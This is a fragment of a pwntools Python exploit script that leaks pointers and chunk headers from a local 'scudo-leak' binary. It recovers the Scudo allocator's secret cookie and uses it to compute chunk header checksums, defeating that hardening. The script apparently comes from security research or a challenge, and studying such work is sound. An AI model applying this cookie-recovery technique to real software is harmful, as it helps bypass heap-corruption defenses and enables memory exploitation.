...
exeName = "./scudo-leak"
e = ELF(exeName)
cookie_addr = e.symbols['_ZN7__scudoL6CookieE']

io = process([exeName, hex(cookie_addr), str(n)])

pointer_leak = {}
header_leak = {}
for i in range(n):
    pointer_leak[i] = int(io.recvline(), 16)
    header_leak[i] = int(io.recvline(), 16)

cookie = break_cookie(pointer_leak[0], header_leak[0])

for i in range(len(pointer_leak)):
    p = pointer_leak[i]
    h = header_leak[i]
    os.system("./scudo-checksum 0x%x 0x%lx 0x%lx" % (cookie, p, h))
